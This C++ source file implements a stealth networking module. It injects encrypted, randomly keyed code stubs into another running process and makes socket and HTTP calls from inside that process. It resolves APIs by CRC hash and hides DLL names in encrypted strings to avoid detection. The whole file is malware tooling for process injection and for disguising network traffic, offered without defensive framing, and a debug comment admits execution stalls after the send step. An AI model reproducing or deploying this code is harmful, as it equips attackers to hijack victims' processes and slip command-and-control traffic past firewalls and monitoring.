#pragma warning(disable : 4477) // format string '%#x' requires an argument of type 'unsigned int'

#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))


#include "StealthNetwork.h"
#include "DebugHeader.h"
#include "Utilities.h"
#include <cstdio>
#include <string>
#include "Meta.h"
#include "WhispererStubs.h"

#pragma region Internal Class
class StealthHttpRequest {
private:

	bool IsAddressSet;
	bool IsPortSet;

	WhispererHostBlock *HostBlock;
	PWHISPERER_CONTEXT RequestContext;
	PWHISPERER_CONTEXT RemoteRequestContext;

	SocketCallStub *SocketBlock;
	ConnectCallStub *ConnectBlock;
	SendCallStub *SendBlock;
	RecvCallStub *RecvBlock;
	CopyCallStub *CopyBlock;
	RequestCleanupStub *CleanupBlock;

	// All the basic blocks need to be decrypted independently of each other

public:
	StealthHttpRequest(WhispererHostBlock *pHostBlock, unsigned long Ebx, unsigned long Edx) {
		this->SocketBlock = new SocketCallStub(Ebx + Utils::Rand(), Edx + Utils::Rand());
		this->ConnectBlock = new ConnectCallStub(Ebx * Utils::Rand(), Edx + Utils::Rand());
		this->SendBlock = new SendCallStub(Ebx - Utils::Rand(), Edx);
		this->RecvBlock = new RecvCallStub(Ebx, Edx ^ Utils::Rand());
		this->CopyBlock = new CopyCallStub(Ebx ^ Utils::Rand(), Edx + Utils::Rand());
		this->CleanupBlock = new RequestCleanupStub(Ebx & Utils::Rand(), Edx ^ Utils::Rand());
		this->HostBlock = pHostBlock;

		this->RequestContext = this->HostBlock->AllocateContext((PVOID*)&this->RemoteRequestContext);
		this->RequestContext->Use6 = FALSE;

		DebugPrint("Allocated context for stealth http request: %#x\r\n", this->RequestContext);

		this->IsAddressSet = false;
		this->IsPortSet = false;
	};

	~StealthHttpRequest() {
		delete this->SocketBlock;
		delete this->ConnectBlock;
		delete this->RecvBlock;
		delete this->CopyBlock;
		delete this->SendBlock;
		delete this->CleanupBlock;
	};

	void PortSet(unsigned short Port) {
		if (this->IsPortSet) return;

		this->RequestContext->Port = HTONS(Port);
		this->IsPortSet = true;
	};
	void Address4Set(unsigned long Address) {
		if (this->IsAddressSet) return;

		this->RequestContext->Address4 = Address;
		this->IsAddressSet = true;
	};
	void Address6Set(unsigned char Address[16]) {
		if (this->IsAddressSet) return;


		Utils::memcpy(this->RequestContext->Address6, Address, 16);
		this->RequestContext->Use6 = TRUE;
		this->IsAddressSet = true;
	};

	char *SendRequest(char *RequestHeader, unsigned long RequestLength, unsigned long *ResponseLength) {
		PWHISPERER_CONTEXT Context = this->RequestContext;
		PWHISPERER_CONTEXT RemoteContext = this->RemoteRequestContext;
		PVOID CurrentBlockAddress = NULL;
		PCHAR ResponseBuffer = NULL;
		ULONG ResponseLen = 0;
		PVOID LocalTransferBuffer = NULL;
		PVOID LocalHttpRequest = NULL;
		PVOID RemoteBlockAddress = NULL;

		Context->RequestLength = RequestLength;
		Context->TransferBlockSize = 0x1000;
		LocalHttpRequest = (unsigned char*)this->HostBlock->AllocMem(NULL, RequestLength, (PVOID*)&Context->HttpRequest);

		if (LocalHttpRequest == NULL)
			return NULL;

		Utils::memcpy(LocalHttpRequest, RequestHeader, RequestLength);


		/* SOCKET */
		CurrentBlockAddress = this->HostBlock->MapStub(this->SocketBlock->get(), this->SocketBlock->len(), &RemoteBlockAddress);
		this->HostBlock->CallStub(CurrentBlockAddress, RemoteBlockAddress, this->SocketBlock->len(), Context, RemoteContext);

		if (Context->SocketHandle == INVALID_SOCKET) // Socket call failed
			return NULL;

		DebugPrint("Socket call success: %#x\r\n", Context->SocketHandle);

		/* CONNECT */
		Utils::memcpy(CurrentBlockAddress, this->ConnectBlock->get(), this->ConnectBlock->len());
		this->HostBlock->CallStub(CurrentBlockAddress, RemoteBlockAddress, this->ConnectBlock->len(), Context, RemoteContext);

		if (Context->ErrorCode == SOCKET_ERROR) // Connect call failed
			return NULL;

		DebugPrint("Connect call success\r\n");

		/* SEND */
		Utils::memcpy(CurrentBlockAddress, this->SendBlock->get(), this->SendBlock->len());
		this->HostBlock->CallStub(CurrentBlockAddress, RemoteBlockAddress, this->SendBlock->len(), Context, RemoteContext); // Can't block on thread b/c undefined behavior

		DebugPrint("Request length: %d vs %d\r\n", RequestLength, Context->ErrorCode);

		if (Context->ErrorCode != RequestLength) // Send call failed to send all bytes
			return NULL;

		DebugPrint("Send call success\r\n"); // succeeeds, but execution doesn't make it past here :u...

		/* RECEIVE */
		Utils::memcpy(CurrentBlockAddress, this->RecvBlock->get(), this->RecvBlock->len());
		this->HostBlock->CallStub(CurrentBlockAddress, RemoteBlockAddress, this->RecvBlock->len(), Context, RemoteContext);

		if (Context->ErrorCode == SOCKET_ERROR)
			return NULL;

		DebugPrint("Receive call success\r\n");
		DebugPrint("Received buffer address: %#x\r\n", Context->ReceiveBuffer);

		LocalTransferBuffer = this->HostBlock->AllocMem(NULL, Context->ResponseLength, &Context->TransferBuffer);
		if (LocalTransferBuffer == NULL)
			return NULL;

		DebugPrint("Allocated TransferBuffer: %#x\r\n", LocalTransferBuffer);

		/* COPY */
		Utils::memcpy(CurrentBlockAddress, this->CopyBlock->get(), this->CopyBlock->len());
		this->HostBlock->CallStub(CurrentBlockAddress, RemoteBlockAddress, this->CopyBlock->len(), Context, RemoteContext);
		
		DebugPrint("Coppied buffer to new address: %#x\r\n", Context->TransferBuffer);
	//	DebugPrint("Response:\r\n%s\r\n", Context->TransferBuffer);

		/* CLEANUP */
		Utils::memcpy(CurrentBlockAddress, this->CleanupBlock->get(), this->CleanupBlock->len());
		this->HostBlock->CallStub(CurrentBlockAddress, RemoteBlockAddress, this->CleanupBlock->len(), Context, RemoteContext);

		DebugPrint("Cleaned up host after http request made\r\n");

		ResponseLen = Context->ResponseLength;
		ResponseBuffer = new char[ResponseLen + 1]();
		if (ResponseBuffer == NULL)
			return NULL;

		Utils::memcpy(ResponseBuffer, LocalTransferBuffer, ResponseLen);
		*ResponseLength = ResponseLen;

		DebugPrint("Successfully sent request\r\n");

		return ResponseBuffer;
	};
};
#pragma endregion

StealthNetwork::StealthNetwork(bool *NetworkActive) {
	PWHISPERER_FUNCTIONS Functions = new WHISPERER_FUNCTIONS();
	

	this->Attached = false;
	this->WhispererFunctions = Functions;

	if (this->WhispererFunctions == NULL)
		throw 0;

	DebugPrint("Allocated WhispererFunctions structure\r\n");

	RetrieveDefaultStubs(&this->DecryptionStub, &this->DecryptionLength);

	DebugPrint("Retrieved default stubs\r\n");
	DebugPrint("Resolving WhispererFunctions\r\n");

	Functions->K32 = new ModuleResolver(0x1133596d);
	Functions->NtDll = new ModuleResolver(0x62c94aee);
	Functions->NtMapViewOfSection = (fnNtMapViewOfSection)Functions->NtDll->ResolveFunctionByCrc(0xc30df1f1);
	Functions->NtCreateSection = (fnNtCreateSection)Functions->NtDll->ResolveFunctionByCrc(0x493d4867);
	Functions->LoadLibraryW = (fnLoadLibraryW)Functions->K32->ResolveFunctionByCrc(0xb0c0ceb3);
	Functions->FreeLibrary = (fnFreeLibrary)Functions->K32->ResolveFunctionByCrc(0xb1ef9263);
	Functions->Iphlp = new ModuleResolver(Functions->LoadLibraryW(PreKeyedEncryptedStringW(L"Iphlpapi.dll")));
	Functions->WinInet = new ModuleResolver(Functions->LoadLibraryW(PreKeyedEncryptedStringW(L"WS2_32.dll")));
	Functions->WinHttp = new ModuleResolver(Functions->LoadLibraryW(PreKeyedEncryptedStringW(L"Winhttp.dll")));
	Functions->WinHttpCrackUrl = (fnWinHttpCrackUrl)Functions->WinHttp->ResolveFunctionByCrc(0xaa1134d7);
	Functions->NtClose = (fnNtClose)Functions->NtDll->ResolveFunctionByCrc(0x9065182e);
	Functions->NtUnmapViewOfSection = (fnNtUnmapViewOfSection)Functions->NtDll->ResolveFunctionByCrc(0x9f9da47b);
	Functions->OpenProcess = (fnOpenProcess)Functions->K32->ResolveFunctionByCrc(0xb4a0e0a7);
	Functions->K32EnumProcessModules = (fnK32EnumProcessModules)Functions->K32->ResolveFunctionByCrc(0x75fdee0);
	Functions->K32GetModuleBaseNameW = (fnK32GetModuleBaseNameW)Functions->K32->ResolveFunctionByCrc(0x3a03104d);
	Functions->K32GetModuleInformation = (fnK32GetModuleInformation)Functions->K32->ResolveFunctionByCrc(0xae13fd1b);

	DebugPrint("Loaded IpHelper locally at: %#x\r\n", Functions->Iphlp->ModuleBase());
	DebugPrint("Loaded WinInet locally at: %#x\r\n", Functions->WinInet->ModuleBase());
	DebugPrint("Loaded WinHttp locally at: %#x\r\n", Functions->WinHttp->ModuleBase());

	DebugPrint("NtMapViewOfSection: %#x\r\n", Functions->NtMapViewOfSection);
	DebugPrint("NtCreateSection: %#x\r\n", Functions->NtCreateSection);
	DebugPrint("LoadLibraryW: %#x\r\n", Functions->LoadLibraryW);
	DebugPrint("FreeLibrary: %#x\r\n", Functions->FreeLibrary);
	DebugPrint("WinHttpCrackUrl: %#x\r\n", Functions->WinHttpCrackUrl);
	DebugPrint("NtClose: %#x\r\n", Functions->NtClose);
	DebugPrint("NtUnmapViewOfSection: %#x\r\n", Functions->NtUnmapViewOfSection);
	DebugPrint("OpenProcess: %#x\r\n", Functions->OpenProcess);
	DebugPrint("K32EnumProcessModules: %#x\r\n", Functions->K32EnumProcessModules);
	DebugPrint("K32GetModuleBaseNameW: %#x\r\n", Functions->K32GetModuleBaseNameW);
	DebugPrint("K32GetModuleInformation: %#x\r\n", Functions->K32GetModuleInformation);

	*NetworkActive = true; // fornow


	this->NetHelp = new NetworkHelpers(NULL);
};
StealthNetwork::~StealthNetwork() {

	DebugPrint("Destructing StealthNetwork\r\n");

	if (this->Attached)
		this->DetachProcess();
	

	/* clean up network helpers */
	delete this->NetHelp;

	/* unload local modules */
	this->WhispererFunctions->FreeLibrary((HMODULE)this->WhispererFunctions->Iphlp->ModuleBase());
	this->WhispererFunctions->FreeLibrary((HMODULE)this->WhispererFunctions->WinInet->ModuleBase());
	this->WhispererFunctions->FreeLibrary((HMODULE)this->WhispererFunctions->WinHttp->ModuleBase());
};

BOOLEAN StealthNetwork::AttachProcess(ULONG TargetProcessId) {
	PWHISPERER_FRAMEWORK Framework = NULL;
	PWHISPERER_CONTEXT LocalContext = NULL;
	PWHISPERER_CONTEXT RemoteContext = NULL;
	SIZE_T BytesWritten = 0;
	PVOID StartupBase = NULL;
	PVOID RemoteStartupBase = NULL;
	StartupCallStub *StartupStub;
	PVOID LocalDecryptionBlock = NULL;

	if (this->Attached)
		return FALSE;

	this->Attached = true;

	this->ProcessHandle = this->WhispererFunctions->OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | SYNCHRONIZE, FALSE, TargetProcessId); // fix
	if (this->ProcessHandle != NULL)
		DebugPrint("Successfully opened process: %d\r\n", TargetProcessId);
	else
	{
		this->Attached = false;
		return FALSE;
	}

	this->HostBlock = new WhispererHostBlock(this->ProcessHandle, this->WhispererFunctions);

	DebugPrint("Created host block\r\n");

	this->NetHelp->UpdateHostBlock(this->HostBlock);

	DebugPrint("Updated network helper host block\r\n");

	Framework = (PWHISPERER_FRAMEWORK)this->HostBlock->FrameworkBase;
	LocalDecryptionBlock = this->HostBlock->AllocMem(NULL, this->DecryptionLength, &Framework->DecryptExecutionBlock);
	
	if (LocalDecryptionBlock == NULL) {
		this->WhispererFunctions->NtClose(this->ProcessHandle);
		delete this->HostBlock;
		this->Attached = false;
		return FALSE;
	};

	DebugPrint("Allocated Decryption block\r\n");
	
	Utils::memcpy(LocalDecryptionBlock, this->DecryptionStub, this->DecryptionLength);
	DebugPrint("Wrote Decryption block\r\n");

	DebugPrint("First byte of internal Decryption stub: %02x\r\n", *(unsigned char*)this->DecryptionStub);
	DebugPrint("First byte of external Decryption stub: %02x\r\n", *(unsigned char*)LocalDecryptionBlock);

	LocalContext = this->HostBlock->AllocateContext((PVOID*)&RemoteContext);
	if (LocalContext == NULL) {
		this->WhispererFunctions->NtClose(this->ProcessHandle);
		delete this->HostBlock;
		this->Attached = false;
		return FALSE;
	}

	DebugPrint("Allocated initial whisperer context: %#x\r\n", LocalContext);

	StartupStub = new StartupCallStub(Utils::Rand(), Utils::Rand());
	StartupBase = this->HostBlock->MapStub(StartupStub->get(), StartupStub->len(), &RemoteStartupBase);
	DebugPrint("Allocated Startup Stub buffer at address: %#x\r\n", StartupBase);

	DebugPrint("Wrote Startup Stub to target process, executing...\r\n");
	this->HostBlock->CallStub(StartupBase, RemoteStartupBase, StartupStub->len(), LocalContext, RemoteContext);

	DebugPrint("Called startup stub\r\n");

	delete StartupStub;

	return TRUE;
};
VOID StealthNetwork::DetachProcess() {
	ShutdownStub *ExitStub = new ShutdownStub(Utils::Rand(), Utils::Rand());
	PWHISPERER_CONTEXT Context = NULL;
	PWHISPERER_CONTEXT RemoteContext = NULL;
	PVOID Base = NULL;
	PVOID LocalBase = NULL;

	DebugPrint("Detaching from process\r\n");

	Context = this->HostBlock->AllocateContext((PVOID*)&RemoteContext);
	if (Context == NULL)
		return;

	LocalBase = this->HostBlock->MapStub(ExitStub->get(), ExitStub->len(), &Base);
	this->HostBlock->CallStub(LocalBase, Base, ExitStub->len(), Context, RemoteContext);

	DebugPrint("Shutdown network api in host process\r\n");

	delete ExitStub;
	delete this->HostBlock;

	this->WhispererFunctions->NtClose(this->ProcessHandle);
	this->Attached = false;
};
VOID StealthNetwork::PerformHttpGet(LPCSTR Url, PUCHAR *BodyOut, ULONG *LengthOut) {
	StealthHttpRequest *Request = NULL;

	if (!this->Attached)
		return;

	Request = new StealthHttpRequest(this->HostBlock, Utils::Rand(), Utils::Rand());

	char *Host = NULL;
	char *Path = NULL;
	char *Ip = NULL;
	char *RequestHeader = NULL;
	char *Response = NULL;

	unsigned long RequestLength = 0;
	unsigned long ResponseLength = 0;

	bool AddressType = false;


	if (!this->NetHelp->CrackUrl((char*)Url, &Host, &Path)) {
		DebugPrint("Unable to crack url: %s\r\n", Url);
		return;
	}

	DebugPrint("Cracked url. host: %s, path: %s\r\n", Host, Path);


	if ((Ip = (char*)this->NetHelp->HostToAddress(Host, &AddressType)) == NULL) {
		DebugPrint("Unable to resolve ip address\r\n");
		return;
	}

	DebugPrint("Resolved ip: %s\r\n", Ip);

	Request->PortSet(80);
	
	if (!AddressType)
		Request->Address4Set(this->NetHelp->IpV4ToBin(Ip));
	else
		Request->Address6Set(this->NetHelp->IpV6ToBin(Ip));

	RequestHeader = this->NetHelp->CreateHttpRequest(PreKeyedEncryptedStringA("GET"), Host, Path, NULL, 0, &RequestLength);
	Response = Request->SendRequest(RequestHeader, RequestLength, &ResponseLength);

	*BodyOut = (unsigned char*)Response;
	*LengthOut = ResponseLength;

	delete Request;
};


